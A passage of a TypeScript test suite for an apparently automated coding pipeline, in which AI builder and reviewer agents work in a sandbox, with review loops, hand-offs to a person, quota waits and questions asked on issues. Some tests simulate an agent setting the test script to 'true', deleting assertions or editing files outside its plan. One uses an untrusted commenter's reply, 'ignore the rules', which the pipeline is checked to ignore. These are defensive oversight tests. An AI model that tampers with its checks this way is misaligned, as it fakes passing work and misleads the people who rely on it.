          throw new Error('unknown agent "gemini" (known: claude-code, codex)')
        },
      }),
      id,
    )

    expect(result).toMatchObject({ status: 'failed', stage: 'sandbox' })
    expect(result.status === 'failed' && result.error).toContain('unknown agent "gemini"')
    expect(sandbox.specs).toHaveLength(0)
  })

  it('records a quota stop as a wait with its reset time, and opens nothing', async () => {
    const id = await seedTask()
    const quota: CodingHarness = {
      name: 'codex',
      egress: agentEgress,
      run: async () => ({
        ok: false,
        summary: 'codex failed: usage limit',
        quota: { message: 'You hit your usage limit', resetsAt: 'Nov 5th, 2026 11:48 AM' },
      }),
    }
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox, { harness: quota }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'build' })
    expect(result.status === 'failed' && result.error).toContain(
      'codex quota ran out, resets Nov 5th',
    )
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(failed.detail).toMatchObject({
      failedAt: 'build',
      quota: true,
      resetsAt: 'Nov 5th, 2026 11:48 AM',
      // The instant, so whoever reads it later does not have to guess the zone and the day.
      resumesAt: '2026-11-05T11:48:00.000Z',
    })
    expect(githubApi.pulls).toEqual([])
    expect(sandbox.stopped).toBe(1)
  })

  it('throws for a task that does not exist', async () => {
    await expect(runTask(deps(new FakeSandbox()), 999)).rejects.toThrow(/does not exist/)
  })
})

const reviewsOf = async (taskId: number) =>
  getDb().select().from(review).where(eq(review.taskId, taskId)).orderBy(review.id)

const finding = { severity: 'major', file: 'src/truncate.js', issue: 'max=0 is not rejected' }

describe('runTask review loop', () => {
  it('opens the pull request with the review in it when the reviewer approves', async () => {
    const id = await seedTask()
    const reviewer = reviewerSaying(verdictJson('approve', [], 'Does what the issue asks.'))

    const result = await runTask(deps(new FakeSandbox(changed()), { reviewer }), id)

    expect(result).toMatchObject({ status: 'done', pullRequestUrl: PR_URL })
    expect(await reviewsOf(id)).toMatchObject([
      { round: 1, sha: 'abc123def', verdict: 'approve', reviewer: 'fake-reviewer' },
    ])
    expect(reviewer.prompts[0]).toContain('git diff abc123def...HEAD')
    expect(reviewer.prompts[0]).toContain('Write truncate(text, max).')
    expect(githubApi.drafts).toEqual([false])
  })

  it('sends the work back to the same session, then opens the pull request on the next approval', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    const reviewer = reviewerSaying(
      verdictJson('changes', [finding], 'max=0 slips through'),
      verdictJson('approve'),
    )

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
      id,
    )

    expect(result).toMatchObject({ status: 'done', sha: 'abc123def2' })
    expect(builder.resumed).toHaveLength(1)
    expect(builder.resumed[0]).toContain('sess-1:')
    expect(builder.resumed[0]).toContain('max=0 is not rejected')
    expect(await stagesOf(id)).toEqual([
      'sandbox',
      'build',
      'push',
      'verify',
      'review',
      'build',
      'push',
      'verify',
      'review',
      'pr',
      'done',
    ])
    expect((await reviewsOf(id)).map((r) => [r.round, r.sha, r.verdict])).toEqual([
      [1, 'abc123def', 'changes'],
      [2, 'abc123def2', 'approve'],
    ])
    expect(githubApi.checkRuns.map((c) => c.headSha)).toEqual(['abc123def', 'abc123def2'])
    expect(githubApi.pulls).toEqual(['factory/7'])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.headSha).toBe('abc123def2')
  })

  it('hands the work to a person after three reviews that all ask for changes', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    const reviewer = reviewerSaying(verdictJson('changes', [finding], 'still wrong'))

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
      id,
    )

    expect(result).toMatchObject({ status: 'handoff', pullRequestUrl: PR_URL })
    expect(result.status === 'handoff' && result.reason).toContain('after 3 attempts')
    expect(builder.resumed).toHaveLength(2)
    expect(reviewer.prompts).toHaveLength(3)
    expect(githubApi.drafts).toEqual([true])
    expect(githubApi.comments).toHaveLength(1)
    expect(githubApi.comments[0]).toContain('draft pull request')
    expect(githubApi.comments[0]).toContain('max=0 is not rejected')
    const stages = await stagesOf(id)
    expect(stages.slice(-2)).toEqual(['review', 'handoff'])
    expect(stages).not.toContain('done')
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row).toMatchObject({ stage: 'handoff', pullRequestUrl: PR_URL })
  })

  it('hands over at once when the reviewer gives no verdict, and does not rework blindly', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    const reviewer = reviewerSaying('Looks good to me, ship it.')

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder, reviewer }),
      id,
    )

    expect(result).toMatchObject({ status: 'handoff' })
    expect(builder.resumed).toHaveLength(0)
    expect((await reviewsOf(id))[0]).toMatchObject({ verdict: 'invalid' })
    expect(githubApi.drafts).toEqual([true])
  })

  it('does not take an approval that lists a blocking finding', async () => {
    const id = await seedTask()
    const reviewer = reviewerSaying(
      verdictJson('approve', [{ severity: 'blocker', issue: 'leaks a key' }]),
    )

    const result = await runTask(deps(new FakeSandbox(changed()), { reviewer }), id)

    expect(result).toMatchObject({ status: 'handoff' })
    expect(githubApi.drafts).toEqual([true])
  })

  it('treats a reviewer that fails as no approval', async () => {
    const id = await seedTask()
    const broken: CodingHarness = {
      name: 'broken-reviewer',
      egress: async () => [],
      run: async () => ({ ok: false, summary: 'segfault' }),
    }

    const result = await runTask(deps(new FakeSandbox(changed()), { reviewer: broken }), id)

    expect(result).toMatchObject({ status: 'handoff' })
    expect((await reviewsOf(id))[0].summary).toContain('the reviewer failed: segfault')
  })

  it('goes back to the builder with the failing output when the checks fail, then passes', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    let runs = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (!c.endsWith('npm test')) return undefined
        runs += 1
        // It fails on the first commit, and again when the factory runs it a second time there.
        return runs <= 2 ? { exitCode: 1, stdout: 'not ok 1 - rejects max below 1' } : undefined
      }),
    )

    const result = await runTask(deps(sandbox, { harness: builder }), id)

    expect(result).toMatchObject({ status: 'done', sha: 'abc123def2' })
    expect(builder.resumed[0]).toContain('not ok 1 - rejects max below 1')
    expect(builder.resumed[0].split('not ok 1 - rejects max below 1')).toHaveLength(2)
    expect(githubApi.checkRuns.map((c) => c.conclusion)).toEqual(['failure', 'success'])
    expect((await getDb().select().from(evidence)).map((e) => [e.sha, e.passed])).toEqual([
      ['abc123def', false],
      ['abc123def', false],
      ['abc123def2', true],
    ])
    expect(await stagesOf(id)).not.toContain('failed')
  })

  it('opens the pull request without a rework when a check fails once and passes when run again', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    let runs = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (!c.endsWith('npm test')) return undefined
        runs += 1
        return runs === 1 ? { exitCode: 1, stdout: 'timed out in 5000ms' } : undefined
      }),
    )

    const result = await runTask(deps(sandbox, { harness: builder }), id)

    expect(result).toMatchObject({ status: 'done', sha: 'abc123def' })
    expect(builder.resumed).toEqual([])
    expect(githubApi.checkRuns.map((c) => c.conclusion)).toEqual(['success'])
    expect((await getDb().select().from(evidence)).map((e) => [e.sha, e.passed])).toEqual([
      ['abc123def', false],
      ['abc123def', true],
    ])
  })

  it('fails at verify, with the attempts it took, when the checks never pass', async () => {
    const id = await seedTask()
    const builder = resumableBuilder()
    const sandbox = new FakeSandbox(
      changed((c) => (c.endsWith('npm test') ? { exitCode: 1, stdout: 'not ok' } : undefined)),
    )

    const result = await runTask(deps(sandbox, { harness: builder }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'verify' })
    expect(result.status === 'failed' && result.error).toContain('after 3 attempts')
    expect(builder.resumed).toHaveLength(2)
    expect(githubApi.pulls).toEqual([])
  })

  it('does not accept an approval when the agent changed the command the checks run', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (c.includes('show HEAD:package.json')) {
          return { stdout: JSON.stringify({ scripts: { test: 'true' } }) }
        }
        if (c.includes(':package.json')) {
          return { stdout: JSON.stringify({ scripts: { test: 'node --test' } }) }
        }
        return undefined
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'handoff' })
    const [stored] = await reviewsOf(id)
    expect(stored.verdict).toBe('changes')
    expect((stored.findings as { issue: string }[]).map((f) => f.issue).join(' ')).toContain(
      'the "test" script was changed',
    )
    expect(githubApi.drafts).toEqual([true])
  })

  it('does not accept an approval when the change takes an assertion out of a test that was there', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => {
        if (c.includes('diff -U0') && c.includes("':(glob)**/*.test.*'")) {
          return {
            stdout: [
              'diff --git a/src/truncate.test.js b/src/truncate.test.js',
              '--- a/src/truncate.test.js',
              '+++ b/src/truncate.test.js',
              '@@ -4 +3,0 @@',
              "-  assert.equal(truncate('abcdef', 3), 'abc')",
            ].join('\n'),
          }
        }
        return undefined
      }),
    )

    const result = await runTask(deps(sandbox), id)

    expect(result).toMatchObject({ status: 'handoff' })
    const [stored] = await reviewsOf(id)
    expect(stored.verdict).toBe('changes')
    expect(stored.findings).toContainEqual(
      expect.objectContaining({
        file: 'src/truncate.test.js',
        issue: expect.stringContaining('1 assertion fewer'),
      }),
    )
  })

  it('throws away anything the reviewer wrote to the checkout', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    await runTask(deps(sandbox), id)

    const commands = sandbox.backend.commands
    const reviewed = commands.findIndex((c) => c.includes('reset --hard abc123def'))
    expect(reviewed).toBeGreaterThan(-1)
    expect(commands[reviewed + 1]).toContain('clean -fd')
  })

  it('says what the agent said when it changed nothing, because that is usually the reason', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(
      changed((c) => (c.includes('status --porcelain') ? { stdout: '' } : undefined)),
    )
    const already: CodingHarness = {
      name: 'already',
      egress: agentEgress,
      run: async () => ({
        ok: true,
        summary: 'The behaviour already exists in\nsrc/truncate.js, so there is nothing to add.',
      }),
    }

    const reviewer = reviewerSaying(verdictJson('changes', [finding], 'it does not'))

    const result = await runTask(deps(sandbox, { harness: already, reviewer }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'review' })
    expect(result.status === 'failed' && result.error).toContain(
      'The agent said: The behaviour already exists in src/truncate.js, so there is nothing to add.',
    )
  })

  it('tells the agent not to ask when the owner marked the repository as unwatched, and lets it ask otherwise', async () => {
    const prompts: string[] = []
    const capture: CodingHarness = {
      name: 'capture',
      egress: agentEgress,
      run: async (_backend, { prompt }) => {
        prompts.push(prompt)
        return { ok: true, summary: 'done' }
      },
    }
    await runTask(deps(new FakeSandbox(changed()), { harness: capture }), await seedTask())
    await getDb()
      .insert(repository)
      .values({ fullName: 'paulo/app', enabled: true, askQuestions: false })
    await runTask(deps(new FakeSandbox(changed()), { harness: capture }), await seedTask(8))

    expect(prompts[0]).toContain('QUESTION:')
    expect(prompts[1]).toContain('Nobody is there to answer a question')
    expect(prompts[1]).not.toContain('QUESTION:')
  })

  it('stops a rework that changes nothing instead of reviewing the same commit again', async () => {
    const id = await seedTask()
    const lazy: CodingHarness = {
      ...resumableBuilder(),
      resume: async () => ({ ok: true, summary: 'nothing to do', sessionId: 'sess-1' }),
    }
    const reviewer = reviewerSaying(verdictJson('changes', [finding]))

    const result = await runTask(deps(new FakeSandbox(changed()), { harness: lazy, reviewer }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'push' })
    expect(result.status === 'failed' && result.error).toContain('no change')
  })

  it("gives the sandbox both agents' firewall rules, and the reviewer's quota stop is a wait", async () => {
    const id = await seedTask()
    const reviewer: CodingHarness = {
      name: 'codex',
      egress: async () => [{ domain: 'chatgpt.com', headers: { authorization: 'Bearer c' } }],
      run: async () => ({
        ok: false,
        summary: 'limit',
        quota: { message: 'usage limit', resetsAt: 'tomorrow' },
      }),
    }
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox, { reviewer }), id)

    expect(sandbox.specs[0].egress.map((r) => r.domain).sort()).toEqual([
      'api.anthropic.com',
      'chatgpt.com',
      'github.com',
      'registry.npmjs.org',
    ])
    expect(result).toMatchObject({ status: 'failed', stage: 'review' })
    const failed = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'failed'))
    )[0]
    expect(failed.detail).toMatchObject({ quota: true, resetsAt: 'tomorrow' })
  })
})

describe('runTask planning before it builds', () => {
  const plan = {
    files: [{ path: 'src/truncate.js', why: 'the function' }],
    order: ['write the test', 'make it pass'],
    risks: [],
    proof: ['npm test'],
    outOfScope: ['the CLI flag'],
  }

  /**
   * A builder that answers the planning turn from a script and leaves work on every later turn. `edits`
   * says whether the planning turn left files changed, as an agent that ignores the rule would.
   */
  function planningBuilder(answers: string[], edits = false) {
    const resumed: string[] = []
    let turn = 0
    const builder: CodingHarness & { resumed: string[] } = {
      name: 'fake-agent',
      egress: agentEgress,
      resumed,
      run: async () => {
        if (turn >= answers.length) {
          dirty = true
          return { ok: true, summary: 'did the work', costUsd: 0.1, sessionId: 'sess-1' }
        }
        dirty = edits
        return { ok: true, summary: answers[turn++], costUsd: 0.05, sessionId: 'sess-1' }
      },
      resume: async (_backend, sessionId, input) => {
        resumed.push(input.prompt)
        if (turn < answers.length)
          return { ok: true, summary: answers[turn++], costUsd: 0.01, sessionId }
        dirty = true
        return { ok: true, summary: 'implemented the plan', costUsd: 0.1, sessionId }
      },
    }
    return builder
  }

  /** A sandbox whose diff touches the planned file and one more. */
  const twoFiles = () =>
    new FakeSandbox(
      changed((c) =>
        c.includes('diff --name-status')
          ? { stdout: 'M\tsrc/truncate.js\nM\tsrc/other.js\n' }
          : undefined,
      ),
    )

  it('stores the plan and builds in the session that wrote it', async () => {
    const id = await seedTask()
    const builder = planningBuilder([`Read it.\n${JSON.stringify(plan)}`])

    const result = await runTask(deps(twoFiles(), { harness: builder, planFirst: true }), id)

    expect(result).toMatchObject({ status: 'done' })
    const stages = await stagesOf(id)
    expect(stages.indexOf('plan')).toBeGreaterThan(-1)
    expect(stages.indexOf('plan')).toBeLessThan(stages.indexOf('build'))
    const [stored] = await getDb().select().from(changePlan).where(eq(changePlan.taskId, id))
    expect(stored).toMatchObject({ baseSha: 'abc123def', harness: 'fake-agent', plan })
    expect(builder.resumed).toHaveLength(1)
    expect(builder.resumed[0]).toContain('Implement the plan')
    expect(builder.resumed[0]).not.toContain('discarded')
  })

  it('gives the reviewer the plan and records a file changed outside it', async () => {
    const id = await seedTask()
    const reviewer = approving()

    await runTask(
      deps(twoFiles(), {
        harness: planningBuilder([JSON.stringify(plan)]),
        reviewer,
        planFirst: true,
      }),
      id,
    )

    expect(reviewer.prompts[0]).toContain("# The builder's plan")
    expect(reviewer.prompts[0]).toContain('- `src/other.js`')
    expect(reviewer.prompts[0]).toContain('implemented the plan')
    expect(reviewer.prompts[0]).not.toContain("# What the factory's checks required")
    const [stored] = await reviewsOf(id)
    expect(stored.findings).toContainEqual({
      severity: 'minor',
      file: 'src/other.js',
      issue: 'changed outside the plan',
    })
    expect(githubApi.bodies[0]).toContain('<summary>Plan</summary>')
    expect(githubApi.bodies[0]).toContain('`src/truncate.js`: the function')
  })

  it('tells the reviewer what a failed check required and does not record that file as outside the plan', async () => {
    const id = await seedTask()
    const reviewer = approving()
    let runs = 0
    const sandbox = new FakeSandbox(
      changed((c) => {
        // The check fails on the first commit, both times it runs there, and passes on the second.
        if (c.endsWith('npm test'))
          return ++runs <= 2 ? { exitCode: 1, stdout: 'error no changesets were found' } : undefined
        if (c.includes('rev-list')) return { stdout: 'abc123def2\nabc123def\n' }
        if (c.includes('diff --name-status'))
          return { stdout: 'M\tsrc/truncate.js\nA\t.changeset/calm-owls.md\nM\tsrc/other.js\n' }
        if (c.includes('diff --name-only --diff-filter=A'))
          return { stdout: '.changeset/calm-owls.md\n' }
        return undefined
      }),
    )

    const result = await runTask(
      deps(sandbox, {
        harness: planningBuilder([JSON.stringify(plan)]),
        reviewer,
        planFirst: true,
      }),
      id,
    )

    expect(result).toMatchObject({ status: 'done', sha: 'abc123def2' })
    expect(reviewer.prompts[0]).toContain("# What the factory's checks required")
    expect(reviewer.prompts[0]).toContain('The check `test` (`npm test`) failed on abc123d with:')
    expect(reviewer.prompts[0]).toContain('> error no changesets were found')
    expect(reviewer.prompts[0]).toContain('- `.changeset/calm-owls.md`')
    const [stored] = await reviewsOf(id)
    expect(stored.findings).toEqual([
      { severity: 'minor', file: 'src/other.js', issue: 'changed outside the plan' },
    ])
  })

  describe('on a branch the integration branch moved past', () => {
    /** A sandbox whose history is a real repository, and whose clone of `workspace` is at `baseSha`. */
    function onHistory(repo: { dir: string; baseSha: string }) {
      let cloned = false
      const history = readsHistory(repo.dir, '/vercel/work')
      return new FakeSandbox(
        changed((command) => {
          if (!cloned && command.endsWith('rev-parse HEAD')) {
            cloned = true
            return { stdout: `${repo.baseSha}\n` }
          }
          return history(command)
        }),
      )
    }

    /** The findings of the first review of a task sent back, whose branch `workspace` moved past. */
    async function sentBack() {
      const id = await seedTask()
      await getDb()
        .insert(changePlan)
        .values({ taskId: id, baseSha: 'cut0001', harness: 'fake-agent', plan })
      const builder = resumableBuilder()
      const sandbox = onHistory(divergedRepository({ behind: true }))

      await runTask(deps(sandbox, { harness: builder, reviewer: approving() }), id, undefined, {
        feedback: 'Rename the helper to cut.',
      })

      const [first] = await reviewsOf(id)
      return first.findings as Finding[]
    }

    it('does not charge the task with a file only the integration branch changed', async () => {
      const findings = await sentBack()

      expect(findings.filter((f) => f.issue === 'changed outside the plan')).toEqual([])
    })

    it('does not report as weakened or deleted a test the integration branch changed', async () => {
      const findings = await sentBack()

      expect(findings.filter((f) => f.file?.endsWith('.test.js'))).toEqual([])
    })

    it('does not block on a test command or a workflow the integration branch changed', async () => {
      const findings = await sentBack()

      expect(findings.filter((f) => f.severity !== 'minor')).toEqual([])
    })

    it('reports on a first run what the change itself did, as before', async () => {
      const id = await seedTask()
      const repo = divergedRepository({
        behind: false,
        branch: {
          ...PLANNED_CHANGE,
          'src/extra.js': 'export {}\n',
          'src/shared.test.js': WEAKENED_TEST,
        },
      })
      const builder = planningBuilder([JSON.stringify(plan)])

      await runTask(
        deps(onHistory(repo), { harness: builder, reviewer: approving(), planFirst: true }),
        id,
      )

      const [first] = await reviewsOf(id)
      expect(first.findings).toEqual([
        {
          severity: 'major',
          file: 'src/shared.test.js',
          issue: 'the change weakens a test that was there before it: it leaves 1 assertion fewer',
        },
        { severity: 'minor', file: 'src/extra.js', issue: 'changed outside the plan' },
        { severity: 'minor', file: 'src/shared.test.js', issue: 'changed outside the plan' },
      ])
    })
  })

  it('throws away what the planning turn changed, and tells the builder', async () => {
    const id = await seedTask()
    const sandbox = twoFiles()
    const builder = planningBuilder([JSON.stringify(plan)], true)

    await runTask(deps(sandbox, { harness: builder, planFirst: true }), id)

    const commands = sandbox.backend.commands
    const reset = commands.findIndex((c) => c.includes('reset --hard abc123def'))
    expect(reset).toBeGreaterThan(-1)
    expect(commands[reset + 1]).toContain('clean -fd')
    expect(commands.findIndex((c) => c.includes('commit -F'))).toBeGreaterThan(reset)
    expect(builder.resumed[0]).toContain('discarded')
  })

  it('asks once more for a plan it could not read, and fails at the plan when there is still none', async () => {
    const id = await seedTask()
    const builder = planningBuilder(['I will look around.', 'Still thinking.'])

    const result = await runTask(deps(twoFiles(), { harness: builder, planFirst: true }), id)

    expect(result).toMatchObject({ status: 'failed', stage: 'plan' })
    expect(result.status === 'failed' && result.error).toContain('the agent wrote no plan')
    expect(builder.resumed).toHaveLength(1)
    expect(builder.resumed[0]).toContain('one JSON object')
    expect(await getDb().select().from(changePlan).where(eq(changePlan.taskId, id))).toEqual([])
  })

  it('takes the plan from the second answer when the first had none', async () => {
    const id = await seedTask()
    const builder = planningBuilder(['I will look around.', JSON.stringify(plan)])

    const result = await runTask(deps(twoFiles(), { harness: builder, planFirst: true }), id)

    expect(result).toMatchObject({ status: 'done' })
    expect(builder.resumed[1]).toContain('Implement the plan')
  })

  it('plans nothing with a builder that cannot resume a session', async () => {
    const id = await seedTask()

    const result = await runTask(deps(twoFiles(), { planFirst: true }), id)

    expect(result).toMatchObject({ status: 'done' })
    expect(await stagesOf(id)).not.toContain('plan')
    expect(await getDb().select().from(changePlan).where(eq(changePlan.taskId, id))).toEqual([])
  })

  it('keeps the plan the task has when a person sends the work back', async () => {
    const id = await seedTask()
    await getDb().insert(changePlan).values({ taskId: id, baseSha: 'old', harness: 'codex', plan })
    const builder = planningBuilder([])
    const reviewer = approving()

    const result = await runTask(
      deps(twoFiles(), { harness: builder, reviewer, planFirst: true }),
      id,
      undefined,
      { feedback: 'Rename the helper to cut.' },
    )

    expect(result).toMatchObject({ status: 'done' })
    expect(await stagesOf(id)).not.toContain('plan')
    expect(await getDb().select().from(changePlan).where(eq(changePlan.taskId, id))).toHaveLength(1)
    expect(reviewer.prompts[0]).toContain('- `src/other.js`')
  })
})

describe('runTask continuing from a branch a person sent back', () => {
  it('starts from the branch the agent pushed and gives the agent the note', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const prompts: string[] = []
    const builder: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async (_b, input) => {
        prompts.push(input.prompt)
        dirty = true
        return { ok: true, summary: 'adjusted' }
      },
    }

    const result = await runTask(deps(sandbox, { harness: builder }), id, undefined, {
      feedback: 'Rename the helper to cut.',
    })

    expect(result).toMatchObject({ status: 'done' })
    expect(prompts[0]).toContain('A person reviewed your earlier pull request')
    expect(prompts[0]).toContain('Rename the helper to cut.')
    const commands = sandbox.backend.commands
    expect(commands.some((c) => c.includes('fetch origin factory/7'))).toBe(true)
    expect(commands.some((c) => c.includes('checkout -B factory/7 FETCH_HEAD'))).toBe(true)
    expect(commands.some((c) => c.includes('checkout -b factory/7'))).toBe(false)
  })

  it('returns to done, and tells the person why, when the agent finds nothing to change', async () => {
    const id = await seedTask()
    await getDb()
      .update(task)
      .set({ stage: 'intake', headSha: 'oldsha1', pullRequestUrl: PR_URL })
      .where(eq(task.id, id))
    const sandbox = new FakeSandbox(changed())
    const builder: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async () => {
        dirty = false // nothing changed: the test the person asked for is already there
        return { ok: true, summary: 'That test is already on the branch.' }
      },
    }

    const result = await runTask(deps(sandbox, { harness: builder }), id, undefined, {
      feedback: 'Add a test for n = 0.',
    })

    expect(result).toMatchObject({ status: 'done', sha: 'oldsha1', pullRequestUrl: PR_URL })
    expect(githubApi.comments).toHaveLength(1)
    expect(githubApi.comments[0]).toContain('That test is already on the branch.')
    expect(githubApi.pulls).toEqual([])
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
    const stages = await stagesOf(id)
    expect(stages.at(-1)).toBe('done')
    expect(stages).not.toContain('failed')
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect(done.detail).toMatchObject({ unchanged: true })
    expect(sandbox.stopped).toBe(1)
  })

  it('hands to a person work whose required checks failed when the agent finds nothing to change', async () => {
    const id = await seedTask()
    await getDb()
      .update(task)
      .set({ stage: 'intake', headSha: 'oldsha1', pullRequestUrl: PR_URL })
      .where(eq(task.id, id))
    const builder: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async () => {
        dirty = false
        return { ok: true, summary: 'The failing check is broken on workspace too.' }
      },
    }

    const result = await runTask(
      deps(new FakeSandbox(changed()), { harness: builder }),
      id,
      undefined,
      {
        feedback: 'CI failed',
        fromChecks: true,
      },
    )

    expect(result).toMatchObject({ status: 'handoff', pullRequestUrl: PR_URL })
    expect(githubApi.comments).toEqual([
      expect.stringMatching(/required checks failed[\s\S]*broken on workspace too/),
    ])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('handoff')
    const handoff = (
      await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'handoff'))
    )[0]
    expect(handoff.detail).toMatchObject({
      reason: expect.stringMatching(/required checks failed and the agent changed nothing/),
      unchanged: true,
    })
  })

  it('does not mention a review when nobody sent anything back', async () => {
    const id = await seedTask()
    const prompts: string[] = []
    const builder: CodingHarness = {
      name: 'fake-agent',
      egress: agentEgress,
      run: async (_b, input) => {
        prompts.push(input.prompt)
        dirty = true
        return { ok: true, summary: 'done' }
      },
    }
    await runTask(deps(new FakeSandbox(changed()), { harness: builder }), id)
    expect(prompts[0]).not.toContain('A person reviewed')
  })
})

describe('mergeEgress', () => {
  it('keeps one rule per domain and refuses two ways to sign the same one', () => {
    const same = { domain: 'a.example', headers: { authorization: 'x' } }
    expect(mergeEgress([[same], [{ ...same }, { domain: 'b.example' }]])).toHaveLength(2)
    expect(() =>
      mergeEgress([[same], [{ domain: 'a.example', headers: { authorization: 'y' } }]]),
    ).toThrow(/sign a.example differently/)
  })
})

/** A builder that asks a question on its first pass and carries on once it is answered. */
function askingBuilder(options: { sessionId?: string; askOnResume?: number } = {}) {
  const sessionId = 'sessionId' in options ? options.sessionId : 'sess-ask'
  const seen: string[] = []
  const harness: CodingHarness & { seen: string[] } = {
    name: 'fake-agent',
    egress: agentEgress,
    seen,
    run: async () => {
      dirty = true
      return {
        ok: true,
        summary: 'I need to know something.\nQUESTION: Should max count the ellipsis?',
        costUsd: 0.05,
        sessionId,
      }
    },
    resume: async (_backend, id, input) => {
      dirty = true
      seen.push(`${id}: ${input.prompt}`)
      const asking = options.askOnResume !== undefined && seen.length === options.askOnResume
      return {
        ok: true,
        summary: asking ? 'Again.\nQUESTION: And the empty string?' : 'Done after the answer.',
        costUsd: 0.05,
        sessionId: id,
      }
    },
  }
  return harness
}

const owner = (over: Partial<IssueComment> = {}): IssueComment => ({
  id: '900',
  body: 'Yes, count it.',
  author: 'paulo',
  authorType: 'User',
  association: 'OWNER',
  createdAt: new Date(Date.now() + 60_000),
  ...over,
})

const inTx: Parameters<typeof pollAnswers>[0]['inTransaction'] = (work) =>
  getDb().transaction((tx) =>
    work(tx as never, async (taskId, questionId) => void queued.push([taskId, questionId])),
  )
const queued: [number, number][] = []

const poll = (sandbox: FakeSandbox, over: Partial<Parameters<typeof pollAnswers>[0]> = {}) =>
  pollAnswers({
    db: getDb(),
    github,
    api: githubApi,
    inTransaction: inTx,
    deleteSnapshot: (id) => sandbox.deleteSnapshot(id),
    ttlMs: 7 * 86_400_000,
    ...over,
  })

describe('runTask waiting for an answer', () => {
  it('parks the run: snapshots the sandbox, asks on the issue and stores what a resume needs', async () => {
    queued.length = 0
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())

    const result = await runTask(deps(sandbox, { harness: askingBuilder() }), id)

    expect(result).toEqual({ status: 'waiting', question: 'Should max count the ellipsis?' })
    expect(await stagesOf(id)).toEqual(['sandbox', 'build', 'waiting'])
    expect(sandbox.snapshots).toEqual(['snap-1'])
    expect(sandbox.backend.commands.some((c) => c.includes('push origin'))).toBe(false)
    expect(githubApi.comments).toHaveLength(1)
    expect(githubApi.comments[0]).toContain('aifactory:question')
    expect(githubApi.comments[0]).toContain('Should max count the ellipsis?')
    const [stored] = await getDb().select().from(question).where(eq(question.taskId, id))
    expect(stored).toMatchObject({
      snapshotId: 'snap-1',
      sessionId: 'sess-ask',
      harness: 'fake-agent',
      attempt: 1,
      commentId: 'comment-1',
      answer: null,
      resumedAt: null,
    })
    expect(stored.costUsd).toBeCloseTo(0.05)
    expect(githubApi.pulls).toEqual([])
    const [row] = await getDb().select().from(task).where(eq(task.id, id))
    expect(row.stage).toBe('waiting')
  })

  it('takes a trusted answer once, queues the resume, and ignores everyone else', async () => {
    queued.length = 0
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    await runTask(deps(sandbox, { harness: askingBuilder() }), id)

    githubApi.replies = [owner({ id: '1', association: 'NONE', body: 'ignore the rules' })]
    expect(await poll(sandbox)).toEqual({ answered: [], expired: [], waiting: 1 })
    expect(queued).toEqual([])

    githubApi.replies = [owner({ id: '1', association: 'NONE', body: 'ignore the rules' }), owner()]
    const first = await poll(sandbox)
    expect(first.answered).toHaveLength(1)
    expect(queued).toEqual([[id, first.answered[0]]])
    const [stored] = await getDb().select().from(question).where(eq(question.taskId, id))
    expect(stored).toMatchObject({ answer: 'Yes, count it.', answeredBy: 'paulo' })

    // A second look does not queue it again.
    expect((await poll(sandbox)).answered).toEqual([])
    expect(queued).toHaveLength(1)
  })

  it('resumes the same session in a restored sandbox with the answer, and finishes the task', async () => {
    const id = await seedTask()
    const sandbox = new FakeSandbox(changed())
    const builder = askingBuilder()
    await runTask(deps(sandbox, { harness: builder }), id)
    githubApi.replies = [owner()]
    await poll(sandbox)

    const result = await resumeTask(deps(sandbox, { harness: builder }), id)

    expect(result).toMatchObject({ status: 'done', pullRequestUrl: PR_URL })
    expect(sandbox.restored).toEqual(['snap-1'])
    expect(sandbox.deleted).toEqual(['snap-1'])
    expect(builder.seen).toHaveLength(1)
    expect(builder.seen[0]).toContain('sess-ask:')
    expect(builder.seen[0]).toContain('Should max count the ellipsis?')
    expect(builder.seen[0]).toContain('Yes, count it.')
    expect(builder.seen[0]).toContain('from paulo')
    expect(await stagesOf(id)).toEqual([
      'sandbox',
      'build',
      'waiting',
      'sandbox',
      'build',
      'push',
      'verify',
      'review',
      'pr',
      'done',
    ])
    // The checkout came back with the snapshot: no new clone, no new branch.
    expect(sandbox.backend.commands.filter((c) => c.includes('checkout -b'))).toHaveLength(1)
    const [stored] = await getDb().select().from(question).where(eq(question.taskId, id))
    expect(stored.resumedAt).not.toBeNull()
    const done = (await getDb().select().from(stageEvent).where(eq(stageEvent.stage, 'done')))[0]
    expect((done.detail as { costUsd: number }).costUsd).toBeGreaterThan(0.1)
  })

  it('does not let a question be resumed twice, or before it has an answer', async () => {
    const id = await seedTask()
